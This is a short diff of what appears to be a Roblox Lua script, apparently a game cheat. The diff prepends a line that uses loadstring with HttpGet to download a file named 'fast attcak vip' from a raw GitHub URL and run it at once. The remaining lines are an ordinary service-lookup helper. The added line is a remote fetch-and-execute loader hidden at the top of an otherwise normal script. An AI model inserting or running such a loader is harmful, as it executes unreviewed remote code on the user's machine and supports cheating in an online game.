@@ -1,3 +1,5 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Duyandroid/Duyandroid/refs/heads/main/fast%20attcak%20vip.txt"))();
 local Services = setmetatable({}, {
     __index = function(self, serviceName)
         local service = game:GetService(serviceName)
